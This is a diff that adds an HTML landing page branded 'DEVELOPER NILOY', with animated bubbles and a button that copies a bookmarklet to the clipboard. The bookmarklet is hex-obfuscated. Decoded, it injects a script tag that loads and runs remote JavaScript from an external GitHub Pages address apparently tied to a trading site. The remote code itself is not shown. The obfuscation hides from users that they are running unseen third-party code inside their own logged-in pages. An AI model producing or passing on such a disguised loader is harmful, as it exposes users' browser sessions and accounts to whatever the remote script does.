@@ -1,0 +1,156 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𝙽𝙸𝙻𝙾𝚈</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Poppins', sans-serif;
+      background: radial-gradient(circle at center, rgba(0,0,0,0.9), rgba(0,0,0,1));
+      color: white;
+    }
+
+    .container {
+      text-align: center;
+      padding: 40px;
+      border-radius: 20px;
+      background: rgba(255, 255, 255, 0.08);
+      backdrop-filter: blur(20px);
+      box-shadow: 0 8px 40px rgba(0,0,0,0.5);
+      position: relative;
+      z-index: 1;
+      width: 90%;
+      max-width: 600px;
+    }
+
+    h1 {
+      font-size: 2.5em;
+      margin-bottom: 20px;
+      letter-spacing: 2px;
+      background: linear-gradient(90deg, #ff00cc, #3333ff, #00ffcc);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: gradientText 5s infinite linear;
+    }
+
+    @keyframes gradientText {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    textarea {
+      width: 100%;
+      height: 120px;
+      border-radius: 12px;
+      border: none;
+      padding: 10px;
+      font-size: 14px;
+      background: rgba(0,0,0,0.6);
+      color: #00ffcc;
+      resize: none;
+      outline: none;
+    }
+
+    button {
+      padding: 12px 30px;
+      margin-top: 15px;
+      border: none;
+      border-radius: 30px;
+      font-size: 16px;
+      cursor: pointer;
+      background: linear-gradient(90deg, #ff00cc, #3333ff, #00ffcc);
+      color: white;
+      transition: 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 20px rgba(255,255,255,0.6);
+    }
+
+    /* টিক মার্ক এনিমেশন */
+    .checkmark {
+      display: none;
+      font-size: 20px;
+      color: #00ffcc;
+      margin-top: 10px;
+      animation: popUp 0.6s ease forwards;
+    }
+
+    @keyframes popUp {
+      0% { transform: scale(0); opacity: 0; }
+      80% { transform: scale(1.2); opacity: 1; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    /* বুদবুদ এনিমেশন */
+    .bubble {
+      position: absolute;
+      bottom: -100px;
+      border-radius: 50%;
+      opacity: 0.7;
+      animation: rise 12s infinite ease-in;
+    }
+
+    @keyframes rise {
+      0% { transform: translateY(0) scale(1); opacity: 0.8; }
+      100% { transform: translateY(-120vh) scale(0.8); opacity: 0; }
+    }
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𝙽𝙸𝙻𝙾𝚈</h1>
+    <textarea id="bookmarklet">javascript:(function(){var _0x1a3e=["\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x69\x61\x6D\x7A\x73\x61\x2E\x67\x69\x74\x68\x75\x62\x2E\x69\x6F\x2F\x51\x55\x4F\x54\x45\x58\x50\x43\x43\x4F\x4F\x44\x2F","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64"];var x=document[_0x1a3e[0]]("script");x[_0x1a3e[1]]=_0x1a3e[2];document.body[_0x1a3e[3]](x);})();
+</textarea>
+    <br>
+    <button onclick="copyCode()">Copy Bookmarklet</button>
+    <div id="check" class="checkmark">✔ Copied!</div>
+  </div>
+
+  <script>
+    function copyCode() {
+      var copyText = document.getElementById("bookmarklet");
+      copyText.select();
+      copyText.setSelectionRange(0, 99999);
+      document.execCommand("copy");
+
+      var check = document.getElementById("check");
+      check.style.display = "block";
+
+      setTimeout(() => {
+        check.style.display = "none";
+      }, 1500);
+    }
+
+    // বুদবুদ জেনারেট
+    function createBubble() {
+      const bubble = document.createElement("div");
+      const size = Math.random() * 40 + 10; 
+      bubble.classList.add("bubble");
+      bubble.style.width = `${size}px`;
+      bubble.style.height = `${size}px`;
+      bubble.style.left = `${Math.random() * 100}%`;
+      bubble.style.background = `hsl(${Math.random() * 360}, 70%, 60%)`;
+      bubble.style.animationDuration = `${6 + Math.random() * 6}s`;
+      document.body.appendChild(bubble);
+
+      setTimeout(() => {
+        bubble.remove();
+      }, 12000);
+    }
+
+    setInterval(createBubble, 400);
+  </script>
+</body>
+</html>
